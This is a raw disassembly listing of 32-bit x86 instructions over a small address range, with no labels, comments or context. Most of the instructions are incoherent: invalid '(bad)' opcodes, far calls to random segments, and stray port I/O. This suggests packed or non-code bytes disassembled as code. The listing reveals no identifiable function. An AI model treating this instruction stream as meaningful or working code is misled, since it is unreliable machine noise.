  4180c8:	mov    eax,ds:0x4df3dda3
  4180cd:	cs ins BYTE PTR es:[edi],dx
  4180cf:	imul   eax,ebp,0x6a4d001a
  4180d5:	sub    eax,DWORD PTR [esi+0xf8e28bc]
  4180db:	mov    WORD PTR [ebp+0x4d8ed724],ss
  4180e1:	out    dx,al
  4180e2:	and    dl,BYTE PTR [edx]
  4180e4:	xor    eax,0x13192dd7
  4180e9:	(bad)  
  4180ea:	or     DWORD PTR [edi+0x5c],ebx
  4180ed:	mov    bh,0x72
  4180ef:	dec    esp
  4180f0:	outs   dx,BYTE PTR ds:[esi]
  4180f1:	xchg   ecx,eax
  4180f2:	cmp    esp,edi
  4180f4:	xchg   ecx,eax
  4180f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4180f6:	neg    DWORD PTR [edi-0x69326dd7]
  4180fc:	icebp  
  4180fd:	(bad)  
  4180fe:	icebp  
  4180ff:	xor    BYTE PTR [edx],ah
  418101:	cmp    edx,DWORD PTR [eax+ebp*1-0x69]
  418105:	sahf   
  418106:	mov    DWORD PTR [ecx+0x5a],esp
  418109:	in     al,dx
  41810a:	jmp    0x9d1327ba
  41810f:	mov    ?,WORD PTR [edx]
  418111:	mov    DWORD PTR [edi+0x7c],edi
  418114:	add    BYTE PTR [edi],dl
  418116:	ffree  st(1)
  418118:	mov    ebx,eax
  41811a:	jnp    0x41819a
  41811c:	sbb    al,0xf2
  41811e:	daa    
  41811f:	mov    cl,0x3d
  418121:	mov    bl,0x92
  418123:	mov    bl,ch
  418125:	dec    ebp
  418126:	aas    
  418127:	int3   
  418128:	push   cs
  418129:	cs mov ecx,0xc6a51f94
  41812f:	and    ebp,ebx
  418131:	loopne 0x4180ff
  418133:	aaa    
  418134:	and    edx,0x9b855eb8
  41813a:	jb     0x41815d
  41813c:	push   ds
  41813d:	and    dh,ah
  41813f:	jg     0x4181a3
  418141:	adc    al,0x82
  418143:	call   0xb0e:0xfdebca77
  41814a:	jne    0x4181b1
  41814c:	and    edi,esp
  41814e:	int3   
  41814f:	and    al,ah
  418151:	mov    ebx,0x3ea306fb
  418156:	sti    
  418157:	sbb    BYTE PTR [esi-0x48437111],al
  41815d:	jmp    0x41814e
  41815f:	jns    0x4180ed
  418161:	cmp    al,0xcd
  418163:	inc    esi
  418164:	enter  0x775d,0x6a
  418168:	ret    
  418169:	dec    eax
  41816a:	push   ecx
  41816b:	sub    BYTE PTR [esi+0x5],bl
  41816e:	dec    edx
  41816f:	dec    edi
  418170:	or     al,BYTE PTR [ebx-0x718773b]
  418176:	dec    esp
  418177:	das    
  418178:	repz or BYTE PTR ds:0x483ad304,ch
  41817f:	test   al,0x25
  418181:	jmp    0x418200
  418183:	lahf   
  418184:	mov    ch,BYTE PTR [eax+edi*4]
  418187:	stos   BYTE PTR es:[edi],al
  418188:	(bad)  
  418189:	mov    edi,0x2698031a
  41818e:	gs dec esp
  418190:	jp     0x418166
  418192:	cmp    esi,DWORD PTR [eax-0x28]
  418195:	jae    0x4181ab
  418197:	inc    edx
  418198:	jne    0x4181f1
  41819a:	into   
  41819b:	jae    0x4181d5
  41819d:	mov    al,cs:0x6dc1b259
  4181a3:	hlt    
  4181a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4181a5:	mov    ch,0x14
  4181a7:	call   0xa1934d7e
  4181ac:	mov    es,WORD PTR [eax]
  4181ae:	xor    ebx,ebp
  4181b0:	adc    dl,BYTE PTR [ecx-0x4e]
  4181b3:	jmp    0x41817a
  4181b5:	inc    edi
  4181b6:	lea    esi,[ecx+0x326f5555]
  4181bc:	lds    ebx,FWORD PTR [edi+0x36]
  4181bf:	in     eax,dx
  4181c0:	lods   al,BYTE PTR ds:[esi]
  4181c1:	push   0x5928702a
  4181c6:	fisubr WORD PTR [esi]
  4181c8:	hlt    
  4181c9:	(bad)  [ebp+0x7f]
  4181cc:	in     eax,0x56
  4181ce:	push   edi
  4181cf:	mov    ?,WORD PTR [edx+edi*2]
  4181d2:	or     BYTE PTR [ecx+ebx*8],bl
  4181d5:	cmp    al,0xa3
  4181d7:	inc    esi
  4181d8:	pop    ebp
  4181d9:	jbe    0x41817b
  4181db:	pop    ds
  4181dc:	inc    edi
  4181dd:	xchg   esi,eax
  4181de:	icebp  
  4181df:	js     0x41817a
  4181e1:	inc    ecx
  4181e2:	xchg   esi,eax
  4181e3:	adc    edx,DWORD PTR [edi+ebx*2-0x13]
  4181e7:	or     al,0x83
  4181e9:	xor    esp,ebx
  4181eb:	push   ecx
  4181ec:	shl    DWORD PTR [edx-0x25],1
  4181ef:	jl     0x4181a7
  4181f1:	(bad)  
  4181f2:	xchg   ebx,eax
  4181f3:	adc    eax,0x4a04ddf1
  4181f8:	jmp    0x41825e
  4181fa:	adc    ah,BYTE PTR [eax+0x715438b9]
  418200:	jmp    0xa6e637c3
  418205:	call   0xac8d:0x8e00481d
  41820c:	leave  
  41820d:	jmp    0xe2243355
  418212:	lahf   
  418213:	lea    eax,[eax]
  418215:	jbe    0x418245
  418217:	sub    al,0xdc
  418219:	or     cl,bh
  41821b:	inc    esp
  41821c:	inc    edi
  41821d:	jle    0x418227
  41821f:	add    eax,0x48e3e282
  418224:	mov    ebp,0x406a48a6
  418229:	pusha  
  41822a:	xchg   DWORD PTR [ebx-0x48],ebp
  41822d:	shl    bh,0x79
  418230:	imul   edi,DWORD PTR [edx-0xb2eb928]
  418237:	cmp    DWORD PTR [ecx-0x6b5faf14],ebx
  41823d:	add    BYTE PTR [ecx-0x44],0x79
  418241:	pop    ebx
  418242:	dec    ecx
  418243:	mov    ds:0x51b2cc56,al
  418248:	out    0x55,al
  41824a:	data16 div al
  41824d:	les    ebp,FWORD PTR [ecx-0x2ce38321]
  418253:	push   es
  418254:	test   BYTE PTR [ebx+0x46],ch
  418257:	popf   
  418258:	push   ebp
  418259:	sbb    DWORD PTR [ecx],ebp
  41825b:	jns    0x418210
  41825d:	push   ebp
  41825e:	es pop esp
  418260:	jge    0x418261
  418262:	mov    bl,0x35
  418264:	add    al,0x61
  418266:	mov    cl,0x9c
  418268:	data16 out dx,al
  41826a:	lods   eax,DWORD PTR ds:[esi]
  41826b:	mov    bh,0x6d
  41826d:	or     al,dh
  41826f:	cmp    ah,al
  418271:	mov    gs,WORD PTR [edi-0x5e]
  418274:	dec    esi
  418275:	inc    ebx
  418276:	inc    esi
  418277:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418278:	cmp    eax,0x3cd0f395
  41827d:	cmp    eax,0x5f1153c8
  418282:	adc    DWORD PTR [edi],edx
  418284:	lahf   
  418285:	in     eax,0x48
  418287:	dec    esi
  418288:	mov    ebx,0x8ecd8c4f
  41828d:	jecxz  0x418243
  41828f:	es push ecx
  418291:	adc    bl,BYTE PTR [eax-0xb]
  418294:	call   0x5e225523
  418299:	sub    ecx,DWORD PTR [ebx+0x108c21f6]
  41829f:	cli    
  4182a0:	popa   
  4182a1:	xor    al,0x9f
  4182a3:	adc    al,0xb6
  4182a5:	fcomip st,st(0)
  4182a7:	gs push esi
  4182a9:	pop    ss
  4182aa:	aas    
  4182ab:	or     eax,0xfa12203b
  4182b0:	push   0x40af4e48
  4182b5:	dec    edi
  4182b6:	jle    0x418251
  4182b8:	imul   BYTE PTR [eax]
  4182ba:	mov    esi,?
  4182bc:	lds    edx,FWORD PTR [ebx]
  4182be:	cld    
  4182bf:	xchg   BYTE PTR [edi],dh
  4182c1:	mov    ebp,0x6c3c3e2
  4182c6:	pushf  
  4182c7:	es retf 0x4ba8
  4182cb:	and    al,0x27
  4182cd:	ja     0x41826f
  4182cf:	push   esp
  4182d0:	jg     0x41831b
  4182d2:	nop    DWORD PTR [edi+0xaca09d2]
  4182d9:	pop    ds
  4182da:	jnp    0x41828f
  4182dc:	out    0x50,eax
  4182de:	dec    ecx
  4182df:	aaa    
  4182e0:	jg     0x418273
  4182e2:	icebp  
  4182e3:	popa   
  4182e4:	mov    eax,DWORD PTR [ebx]
  4182e6:	mov    al,BYTE PTR [eax+0x79]
  4182e9:	nop
  4182ea:	clc    
  4182eb:	cmp    eax,0x2679c3e5
  4182f0:	jmp    0x6fb2:0x992a3bc5
  4182f7:	test   eax,0xa8853799
  4182fc:	push   ds
  4182fd:	adc    al,0xca
  4182ff:	and    dh,cl
  418301:	cmp    ebp,DWORD PTR [esi+0x2f]
  418304:	add    eax,0xc686fa90
  418309:	pop    ebp
  41830a:	cwde   
  41830b:	mov    esi,0x1fd5df7f
  418310:	push   cs
  418311:	mov    eax,0x4d9aba8d
  418316:	add    bl,BYTE PTR [eax]
  418318:	dec    edi
  418319:	fwait
  41831a:	adc    ecx,edi
  41831c:	fisub  WORD PTR [eax]
  41831e:	add    edx,0x86c0503b
  418324:	mov    ds:0xbf000ed,eax
  418329:	aad    0xe9
  41832b:	in     al,dx
  41832c:	(bad)  
  41832e:	add    al,0xf8
  418330:	int    0xb6
  418332:	inc    eax
  418333:	int    0xd1
  418335:	and    ebp,DWORD PTR [edx]
  418337:	fbstp  TBYTE PTR [ecx-0x1f]
  41833a:	push   edi
  41833b:	ja     0x4182cb
  41833d:	lods   eax,DWORD PTR ds:[esi]
  41833e:	cmc    
  41833f:	xor    DWORD PTR [ecx+0x49bac4b5],ebp
  418345:	jmp    0x41836a
  418347:	sbb    eax,0x398fa33d
  41834c:	add    esp,DWORD PTR cs:[ebx+0x29]
  418350:	shl    DWORD PTR [eax+0x44],cl
  418353:	aaa    
  418354:	jecxz  0x4183b2
  418356:	inc    esp
  418357:	out    0x4d,eax
  418359:	pop    esi
  41835a:	pop    ecx
  41835b:	cld    
  41835c:	rol    bl,0xa
  41835f:	pop    esp
  418360:	or     eax,0x144466b9
  418365:	iret   
  418366:	fs stc 
  418368:	les    ebx,FWORD PTR [eax+0x41]
  41836b:	les    eax,FWORD PTR [edi+0x40688dbb]
  418371:	lea    esp,[edx+0x4859dddc]
  418377:	adc    al,BYTE PTR [ebp-0x2d]
  41837a:	push   edi
  41837b:	test   al,0x8
  41837d:	mov    eax,0x35009fda
  418382:	ins    DWORD PTR es:[edi],dx
  418383:	out    0x7d,eax
  418385:	enter  0xbcdc,0x8d
  418389:	xor    eax,0x93757580
  41838e:	mov    ds:0x3fc4bee2,eax
  418393:	inc    esp
  418394:	ret    
  418395:	cmp    BYTE PTR [eax+0x5da39cd],bl
  41839b:	push   ss
  41839c:	xlat   BYTE PTR ds:[ebx]
  41839d:	adc    eax,0xf4352605
  4183a2:	dec    edi
  4183a3:	xchg   edx,eax
  4183a4:	or     bl,BYTE PTR [eax]
  4183a6:	push   ds
  4183a7:	ins    BYTE PTR es:[edi],dx
  4183a8:	dec    ebx
  4183a9:	imul   esi,DWORD PTR [ecx-0x3b],0xffffffa6
  4183ad:	xor    al,0x3a
  4183af:	and    esp,edx
  4183b1:	loop   0x41835d
  4183b3:	or     edi,DWORD PTR [esi+0x587f6045]
  4183b9:	inc    edx
  4183ba:	cli    
  4183bb:	dec    eax
  4183bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4183bd:	xor    eax,0x33a66d6a
  4183c2:	cmp    DWORD PTR [esi+esi*1-0xe6c7503],eax
  4183c9:	lods   eax,DWORD PTR ds:[esi]
  4183ca:	mov    eax,0x41b206ab
  4183cf:	xor    bh,bl
  4183d1:	cdq    
  4183d2:	mov    al,ds:0xfef64146
  4183d7:	je     0x41839a
  4183d9:	aam    0xa5
  4183db:	sahf   
  4183dc:	xchg   ebx,eax
  4183dd:	inc    edx
  4183de:	ret    0xeb9
  4183e1:	ror    edx,cl
  4183e3:	call   0x76cb:0x6bfa20c
  4183ea:	jge    0x4183ae
  4183ec:	pusha  
  4183ed:	add    dl,BYTE PTR [edi]
  4183ef:	leave  
  4183f0:	add    al,0xa3
  4183f2:	push   cs
  4183f3:	push   cs
  4183f4:	or     al,0x74
  4183f6:	leave  
  4183f7:	push   edx
  4183f8:	xchg   ecx,eax
  4183f9:	dec    esi
  4183fa:	xor    BYTE PTR [ebx+0x18],ah
  4183fd:	or     BYTE PTR [esi+0x5d6f2388],ch
  418403:	iret   
  418404:	adc    edx,DWORD PTR [esi+esi*2-0x27]
  418408:	ja     0x418446
  41840a:	dec    ebp
  41840b:	dec    ebx
  41840c:	adc    BYTE PTR [edx-0xbbabbf3],cl
  418412:	ins    DWORD PTR es:[edi],dx
  418413:	pusha  
  418414:	add    eax,0x88d2cf27
  418419:	iret   
  41841a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41841b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41841c:	mov    eax,eax
  41841e:	test   eax,0x44ac35cd
  418423:	and    al,0xa2
  418425:	and    al,0xc9
  418427:	std    
  418428:	loop   0x41844f
  41842a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41842b:	and    BYTE PTR [edx],dl
  41842d:	popa   
  41842e:	cmp    ch,bh
  418430:	add    BYTE PTR [edx+0x3d6fd287],ah
  418436:	xor    cl,BYTE PTR [edx]
  418438:	outs   dx,DWORD PTR ds:[esi]
  418439:	and    BYTE PTR [ebp+0x45],0x15
  41843d:	xor    DWORD PTR [ebp+0x3b77249e],ecx
  418443:	pop    edx
  418444:	stc    
  418445:	mov    al,0xbf
  418448:	pop    eax
  418449:	sub    eax,0x445ffda5
  41844e:	std    
  41844f:	scas   eax,DWORD PTR es:[edi]
  418450:	cdq    
  418451:	push   0x470f7d23
  418456:	jbe    0x418447
  418458:	(bad)  
  418459:	ds jl  0x4184c3
  41845c:	jns    0x4183f4
  41845e:	push   eax
  41845f:	sbb    eax,0x57f6de81
  418464:	jb     0x4183fd
  418466:	inc    esi
  418467:	ret    
  418468:	pop    esp
  418469:	addr16 inc esp
  41846b:	push   cs
  41846c:	jbe    0x418489
  41846e:	fiadd  WORD PTR [esi+0x48b75008]
  418474:	mov    edx,0xba22eebf
  418479:	fcomi  st,st(1)
  41847b:	cwde   
  41847c:	jno    0x41845b
  41847e:	jecxz  0x4184ec
  418480:	mov    eax,0x2b4540bc
  418485:	mov    WORD PTR [edx],es
  418487:	call   0xaf72f309
  41848c:	ret    
  41848d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41848e:	push   ebx
  41848f:	and    bh,bl
  418491:	pop    eax
  418492:	cwde   
  418493:	ins    BYTE PTR es:[edi],dx
  418494:	les    esi,FWORD PTR [esi]
  418496:	or     BYTE PTR [eax],al
	...
  418514:	push   edi
  418515:	lea    esp,[ecx+0x7e]
  418518:	sti    
  418519:	(bad)  
  41851a:	pop    edi
  41851b:	lods   eax,DWORD PTR ds:[esi]
  41851c:	into   
  41851d:	fisttp DWORD PTR [edx+0x58]
  418520:	fisubr WORD PTR [esi+0x2707ecd0]
  418526:	add    DWORD PTR [eax],eax
  418528:	imul   eax,DWORD PTR [edi],0x0
  41852b:	add    al,dh
  41852d:	mov    bh,0xd4
  41852f:	loopne 0x418521
  418531:	imul   esp,DWORD PTR [edi],0x6f
  418534:	sub    eax,0xca93336
  418539:	pushf  
  41853a:	test   eax,0x202ddb34
  41853f:	dec    eax
  418540:	stos   BYTE PTR es:[edi],al
  418541:	jae    0x41856f
  418543:	xchg   ebx,eax
  418544:	nop
  418545:	mov    al,ds:0x89cf3550
  41854a:	stc    
  41854b:	adc    DWORD PTR [ebp-0x55],edi
  41854e:	inc    esi
  41854f:	aaa    
  418550:	fimul  DWORD PTR [edx]
  418552:	cmp    eax,0x4b4e76c2
  418557:	add    al,0x1e
  418559:	jmp    0xa0c8:0x7aab46cb
  418560:	sbb    DWORD PTR [ebx-0x11],0xffffffef
  418564:	or     ch,BYTE PTR [ebp-0x3ff2c0ed]
  41856a:	xor    DWORD PTR ds:[edi+0x42],esi
  41856e:	les    ebp,FWORD PTR [esp+eiz*8]
  418571:	gs pop ds
  418573:	add    bl,ah
  418575:	mov    dh,0x3e
  418577:	gs mov al,0x27
  41857a:	cmp    esp,ebp
  41857c:	pop    ecx
  41857d:	(bad)  
  41857e:	jge    0x4185e0
  418580:	sub    edi,DWORD PTR [ecx]
  418582:	inc    esp
  418583:	add    eax,0xb7e32708
  418588:	mov    edi,0xda0180eb
  41858d:	jle    0x4185bb
  41858f:	mul    DWORD PTR [esi+0x3cba96f8]
  418595:	fs popa 
  418597:	sbb    DWORD PTR [edx],esi
  418599:	cdq    
  41859a:	(bad)  
  41859b:	mov    ecx,0x69d6ac42
  4185a0:	in     eax,0x22
  4185a2:	add    eax,0xaa992fa1
  4185a7:	mov    edx,0x8ba177fe
  4185ac:	ja     0x418613
  4185ae:	mov    edi,ss
  4185b0:	rcr    DWORD PTR [ecx],0x73
  4185b3:	addr16 dec ebx
  4185b5:	or     eax,0x25953924
  4185ba:	repz cmp eax,0x213f31e1
  4185c0:	popf   
  4185c1:	test   BYTE PTR [edx],bl
  4185c3:	pop    edi
  4185c4:	push   0xffffffe5
  4185c6:	aam    0x7f
  4185c8:	pop    ss
  4185c9:	daa    
  4185ca:	and    DWORD PTR [eax+edx*1+0x51735339],ecx
  4185d1:	mov    eax,ds:0xc8cd4fb9
  4185d6:	adc    eax,0xb2f248ea
  4185db:	(bad)  
  4185dc:	sbb    al,BYTE PTR [edx*8+0x4b75e09e]
  4185e3:	sub    al,0x2a
  4185e5:	add    esi,DWORD PTR [eax+esi*1]
  4185e8:	(bad)  
  4185e9:	mov    esi,DWORD PTR [edi]
  4185eb:	or     ecx,DWORD PTR [edi]
  4185ed:	sub    al,0x80
  4185ef:	adc    al,0xad
  4185f1:	mov    edi,0x7d201a16
  4185f6:	fld    st(3)
  4185f8:	lock ror DWORD PTR [esi+eiz*2+0xfcdc72a],1
  418600:	in     al,dx
  418601:	imul   edx,DWORD PTR [edi+0x5e4245a4],0x33
  418608:	not    DWORD PTR [ebx+eiz*1-0x42]
  41860c:	mov    edx,0x6a2924e5
  418611:	jne    0x4185c4
  418613:	imul   ecx,DWORD PTR [esi+esi*4-0x21db4036],0xffffffd3
  41861b:	jge    0x418688
  41861d:	loopne 0x418629
  41861f:	icebp  
  418620:	fcomp  QWORD PTR [eax-0x2d]
  418623:	and    al,bh
  418625:	out    0xd8,al
  418627:	data16 je 0x418652
  41862a:	(bad)  [edi-0x52]
  41862d:	jno    0x4185d3
  41862f:	(bad)  
  418630:	xor    eax,DWORD PTR [ebp+edi*4-0x28257a4e]
  418637:	push   esp
  418638:	stc    
  418639:	xchg   esp,eax
  41863a:	arpl   WORD PTR [ecx-0x16],cx
  41863d:	ret    
  41863e:	inc    ecx
  41863f:	xchg   ecx,eax
  418640:	or     ebx,DWORD PTR ds:0x88db7a94
  418646:	rol    DWORD PTR [ebp+0x43],0x58
  41864a:	sbb    dl,ah
  41864c:	daa    
  41864d:	adc    ah,bh
  41864f:	xlat   BYTE PTR ds:[ebx]
  418650:	add    bh,ch
  418652:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418653:	mov    bh,0x5b
  418655:	scas   al,BYTE PTR es:[edi]
  418656:	sbb    DWORD PTR [edx],eax
  418658:	cs push esp
  41865a:	fnstcw WORD PTR [ebx-0x29]
  41865d:	cs mov ch,0xe9
  418660:	or     BYTE PTR ds:0x7bfe7a07,0x39
  418667:	or     DWORD PTR [eax-0x3c],0xffffff96
  41866b:	dec    ebx
  41866c:	out    dx,al
  41866d:	dec    ecx
  41866e:	jle    0x418693
  418670:	lods   eax,DWORD PTR ds:[esi]
  418671:	out    0xb3,al
  418673:	imul   ecx,DWORD PTR [esp+edx*2-0x7f2dc703],0xb0fa4703
  41867e:	adc    ch,ch
  418680:	imul   edx,DWORD PTR [ebp+ebp*8-0x2cba2227],0x9c23e248
  41868b:	and    al,0x45
  41868d:	jp     0x418700
  41868f:	sbb    bl,BYTE PTR [ebp+0x74e046f0]
  418695:	in     al,0x2d
  418697:	lock sub edi,ecx
  41869a:	add    dl,ch
  41869c:	sub    al,0xf2
  41869e:	push   esi
  41869f:	mov    eax,0xd9d4f547
  4186a4:	sbb    eax,0x222430b5
  4186a9:	icebp  
  4186aa:	add    DWORD PTR [ecx-0x10],ecx
  4186ad:	cli    
  4186ae:	mov    bh,BYTE PTR [edx+eiz*1+0x440bc4b7]
  4186b5:	mov    dh,0xc5
  4186b7:	xor    eax,0x693319a9
  4186bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4186bd:	jge    0x4186ee
  4186bf:	sbb    BYTE PTR [eax-0x79],bh
  4186c2:	sub    ecx,DWORD PTR [esi]
  4186c4:	fs inc eax
  4186c6:	pushf  
  4186c7:	int3   
  4186c8:	imul   ebx,DWORD PTR [ecx],0xa7d64fd9
  4186ce:	je     0x4186c8
  4186d0:	jecxz  0x41871f
  4186d2:	xchg   esp,eax
  4186d3:	fstp   DWORD PTR [edx+eax*4]
  4186d6:	add    eax,0x215a17c8
  4186db:	mov    al,ds:0xe0db0b4
  4186e0:	fist   DWORD PTR [ecx+0x1b9ddb25]
  4186e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4186e7:	retf   0x548f
  4186ea:	dec    ebx
  4186eb:	or     al,0x0
  4186ed:	mov    fs,WORD PTR [edi]
  4186ef:	ins    BYTE PTR es:[edi],dx
  4186f0:	jb     0x41872a
  4186f2:	js     0x41867c
  4186f4:	pop    ebp
  4186f5:	(bad)  
  4186f6:	ds fsub st,st(4)
  4186f9:	stc    
  4186fa:	(bad)  
  4186fb:	rol    ah,cl
  4186fd:	adc    BYTE PTR [ecx-0x2d],ah
  418700:	mov    esi,0xf0a1f04b
  418705:	mov    ds:0xa2f1b0af,eax
  41870a:	(bad)  
  41870b:	jge    0x418769
  41870d:	sbb    esi,DWORD PTR [edi]
  41870f:	xor    esp,0x3650af9e
  418715:	push   ebx
  418716:	shr    DWORD PTR ds:0xf3b1167c,0x65
  41871d:	nop
  41871e:	in     al,dx
  41871f:	push   esp
  418720:	fld    TBYTE PTR [ecx+0x35]
  418723:	jnp    0x418760
  418725:	adc    eax,0x335423da
  41872b:	push   ss
  41872c:	lea    edx,[edi-0x3ab2f713]
  418732:	and    eax,0x734b1d93
  418737:	adc    DWORD PTR [edx+0x50],esp
  41873a:	sbb    ecx,DWORD PTR [edi]
  41873c:	mov    ds:0x1f957f89,al
  418741:	jno    0x418701
  418743:	daa    
  418744:	mov    dl,0x67
  418746:	aaa    
  418747:	mov    WORD PTR [edx-0x79ca1f5f],fs
  41874d:	xor    DWORD PTR [ebx],ebx
  41874f:	adc    al,0x83
  418751:	loope  0x4187b4
  418753:	clc    
  418754:	scas   eax,DWORD PTR es:[edi]
  418755:	test   DWORD PTR [eax],eax
  418757:	adc    edi,0x26b8e864
  41875d:	enter  0xda05,0xf7
  418761:	retf   
  418762:	cmp    al,0x43
  418764:	(bad)  
  418765:	jle    0x4187a0
  418767:	retf   
  418768:	repnz mov cl,bh
  41876b:	retf   0x3748
  41876e:	mov    al,ch
  418770:	dec    esp
  418771:	xor    dl,0x6b
  418774:	cmp    edx,0x51
  418777:	(bad)  [esi+ebx*4+0x322cfdd]
  41877e:	sub    edi,DWORD PTR [esi]
  418780:	sub    eax,0xd46ad011
  418785:	push   ebp
  418786:	lods   al,BYTE PTR ds:[esi]
  418787:	mov    al,ds:0x9d923ae2
  41878c:	xor    DWORD PTR [eax+edx*8-0x77],eax
  418790:	dec    esp
  418791:	and    al,ah
  418793:	jae    0x4187ba
  418795:	mov    ds:0x2bd0f3e2,eax
  41879a:	ja     0x418744
  41879c:	sbb    BYTE PTR [ecx+0x36],dh
  41879f:	aas    
  4187a0:	stos   BYTE PTR es:[edi],al
  4187a1:	enter  0x3213,0xef
  4187a5:	leave  
  4187a6:	inc    eax
  4187a7:	loop   0x418773
  4187a9:	inc    esi
  4187aa:	std    
  4187ab:	fsub   DWORD PTR [ecx-0x16]
  4187ae:	cld    
  4187af:	jnp    0x4187c5
  4187b1:	or     al,0x8d
  4187b3:	mov    bl,0xb1
  4187b5:	pop    es
  4187b6:	dec    ecx
  4187b7:	ds aad 0xcc
  4187ba:	lahf   
  4187bb:	je     0x418786
  4187bd:	mov    ah,0x7c
  4187bf:	push   0x36
  4187c1:	sub    dh,BYTE PTR [ecx+0x5ccf214]
  4187c7:	add    DWORD PTR [esi],0xf4d8e7
  4187cd:	add    esi,edi
  4187cf:	and    eax,0x27941691
  4187d4:	pop    ecx
  4187d5:	repnz add al,0x87
  4187d8:	mov    esp,0x4dc290b7
  4187dd:	push   0x7b980cf3
  4187e2:	add    ebx,DWORD PTR ds:0x75b5b2d
  4187e8:	(bad)
  4187ee:	cli    
  4187ef:	lods   al,BYTE PTR ds:[esi]
  4187f0:	(bad)  
  4187f1:	xchg   ecx,eax
  4187f2:	add    DWORD PTR [esi-0x30],esi
  4187f5:	adc    eax,0x7ef7491e
  4187fa:	in     eax,0x22
  4187fc:	pop    es
  4187fd:	in     al,0xdf
  4187ff:	lock ret 
  418801:	dec    ecx
  418802:	punpcklwd mm6,DWORD PTR [ebx]
  418805:	call   0x4a18:0x2e9785f4
  41880c:	ror    BYTE PTR [ecx-0xeb5712d],cl
  418812:	je     0x41882e
  418814:	call   DWORD PTR [ecx-0x6c859827]
  41881a:	sar    cl,1
  41881c:	mov    ds:0x3678d1f0,eax
  418821:	cvtdq2ps xmm5,XMMWORD PTR [eax-0x3e]
  418825:	mov    edi,0xfb5d38ff
  41882a:	and    al,dh
  41882c:	inc    ebx
  41882d:	push   ebx
  41882e:	stos   DWORD PTR es:[edi],eax
  41882f:	jbe    0x41884f
  418831:	push   esp
  418832:	scas   al,BYTE PTR es:[edi]
  418833:	push   es
  418834:	cmp    ah,dl
  418836:	stos   DWORD PTR es:[edi],eax
  418837:	lock xchg esi,eax
  418839:	loop   0x418824
  41883b:	ret    0xccc2
  41883e:	inc    eax
  41883f:	jmp    0x2a9d:0x5ce8e420
  418846:	push   esi
  418847:	jno    0x418839
  418849:	outs   dx,BYTE PTR ds:[esi]
  41884a:	repnz mov edx,0xb5332f55
  418850:	shl    DWORD PTR [edi+0x51],0x5e
  418854:	pop    ss
  418855:	push   ds
  418856:	pop    ecx
  418857:	ins    DWORD PTR es:[edi],dx
  418858:	dec    esi
  418859:	ror    bl,cl
  41885b:	sbb    al,0x0
  41885d:	push   0xa8e79228
  418862:	fsubr  QWORD PTR [edx+0x4c]
  418865:	inc    esp
  418866:	mov    bl,0xaf
  418868:	cmp    bh,BYTE PTR [esi-0x5b]
  41886b:	and    BYTE PTR [ecx+0xf],dl
  41886e:	loop   0x418818
  418870:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418871:	fistp  DWORD PTR [ecx-0x14]
  418874:	out    dx,al
  418875:	sub    DWORD PTR [esi-0x40],ebx
  418878:	lahf   
  418879:	arpl   WORD PTR [ebp-0x5d],cx
  41887c:	pop    ss
  41887d:	retf   
  41887e:	fwait
  41887f:	hlt    
  418880:	repz pop edx
  418882:	jl     0x41889d
  418884:	out    0x9e,eax
  418886:	inc    eax
  418887:	test   BYTE PTR [esi-0x79],ah
  41888a:	and    bl,ah
  41888c:	repnz mov ds:0xc6a0385f,eax
  418892:	or     eax,0xbec1da07
  418897:	mov    esi,0x95f07b8e
  41889c:	dec    esi
  41889d:	pop    esi
  41889e:	xchg   edi,eax
  41889f:	jmp    DWORD PTR [edx+0x3]
  4188a2:	iret   
  4188a3:	ja     0x418913
  4188a5:	push   0xe7cc197a
  4188aa:	dec    edi
  4188ab:	mov    cl,BYTE PTR [edi+0x37]
  4188ae:	in     al,dx
  4188af:	std    
  4188b0:	cmp    esi,DWORD PTR [eax-0xdfbb352]
  4188b6:	and    al,0x33
  4188b8:	add    dl,BYTE PTR [ebx]
  4188ba:	sub    DWORD PTR [ebx],eax
  4188bc:	out    dx,al
  4188bd:	xchg   ebx,eax
  4188be:	ja     0x418876
  4188c0:	inc    eax
  4188c1:	sbb    bh,al
  4188c3:	out    0xe0,al
  4188c5:	je     0x4188ec
  4188c7:	dec    ecx
  4188c8:	popf   
  4188c9:	dec    ecx
  4188ca:	int    0x7f
  4188cc:	ja     0x41892e
  4188ce:	scas   al,BYTE PTR es:[edi]
  4188cf:	cdq    
  4188d0:	pop    ebx
  4188d1:	and    al,0xf4
  4188d3:	ss jecxz 0x418865
  4188d6:	pop    edx
  4188d7:	cdq    
  4188d8:	out    dx,eax
  4188d9:	fld    QWORD PTR [ebx-0x68a181a4]
  4188df:	stos   BYTE PTR es:[edi],al
  4188e0:	mov    al,ds:0xe5f670c0
  4188e5:	rcr    dh,0xad
  4188e8:	cmp    ah,al
  4188ea:	es jo  0x4188e5
  4188ed:	dec    esi
  4188ee:	cmp    al,0x70
  4188f0:	sbb    BYTE PTR [ebp*4+0x7ad2bcdc],0xb7
  4188f8:	mov    bl,BYTE PTR [edi]
  4188fa:	imul   esi,ebp,0xaf1f91e9
  418900:	and    DWORD PTR [edx-0x48],edx
  418903:	xchg   eax,esp
  418905:	or     al,0xd0
  418907:	jb     0x41896a
  418909:	retf   0x175a
  41890c:	sbb    BYTE PTR [esi-0x72],0x24
  418910:	iret   
  418911:	inc    esp
  418912:	mov    bh,dh
  418914:	push   0x1d8b0ef0
  418919:	(bad)  
  41891a:	lods   eax,DWORD PTR ds:[esi]
  41891b:	sti    
  41891c:	jmp    0x4188b8
  41891e:	sub    BYTE PTR ds:[edi-0x5],bh
  418922:	ss xchg ebp,eax
  418924:	arpl   WORD PTR [ebx+0x30b4ccb3],sp
  41892a:	xchg   ebp,eax
  41892b:	cmp    bh,bh
  41892d:	xor    BYTE PTR [ebx+edx*2],dl
  418930:	cmp    al,0x2
  418932:	mov    fs,WORD PTR [ebx-0x4e]
  418935:	xchg   edx,eax
  418936:	call   0xeacf:0xdc6b918c
  41893d:	test   al,0x38
  41893f:	mov    ch,0x52
